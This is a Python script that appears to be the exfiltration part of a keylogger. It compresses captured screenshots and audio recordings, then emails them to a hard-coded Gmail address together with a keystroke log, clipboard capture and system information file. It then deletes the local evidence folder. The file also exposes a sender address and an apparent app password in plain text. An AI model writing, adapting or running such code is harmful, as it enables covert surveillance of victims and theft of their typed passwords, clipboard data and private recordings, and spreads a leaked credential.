import shutil
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import os
from zipfile import ZipFile

toaddr = "dhruval790@gmail.com"
fromaddr = "dhruvalgandhi33@gmail.com"
base = os.path.expanduser('~')
file_path = os.path.join(base,'Desktop','Keylogger')
extend = "\\"
x = ['key_log.txt', 'systeminfo.txt', 'clipboard.txt', 'Recording.zip', 'shots.zip']


def send_email(filename, attachment, toaddr):
    msg = MIMEMultipart()

    msg['From'] = fromaddr

    msg['To'] = toaddr

    msg['Subject'] = "Log File"

    body = "Body_of_the_mail"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')

    p.set_payload(attachment.read())
    encoders.encode_base64(p)

    p.add_header('Content-Disposition', 'attachment; filename= %s' % filename)

    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, "gxwrakgweufzrcfn")
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()

def do_zip():
    global file_path
    path = os.path.join(file_path,'SS')


    files = []
    for cp,d,f in os.walk(path):
        for x in f:
            p = os.path.join(cp,x)
            files.append(p)

    with ZipFile(os.path.join(file_path,'shots.zip'),'w') as zip:
        for f in files:
            zip.write(f)

def do_zip_1():
    global file_path
    path = os.path.join(file_path,'Rec')


    files = []
    for cp,d,f in os.walk(path):
        for x in f:
            p = os.path.join(cp,x)
            files.append(p)

    with ZipFile(os.path.join(file_path,'Recording.zip'),'w') as zip:
        for f in files:
            zip.write(f)

do_zip() #for SS
do_zip_1() #for Rec

def final_send():
    global x
    try:
        for j in x:
            send_email(j, file_path + extend + j, toaddr)

        return True
    except:
        pass
        final_send()



check = final_send()


if check == True:
    try:
        shutil.rmtree(file_path)
    except:
        pass
        
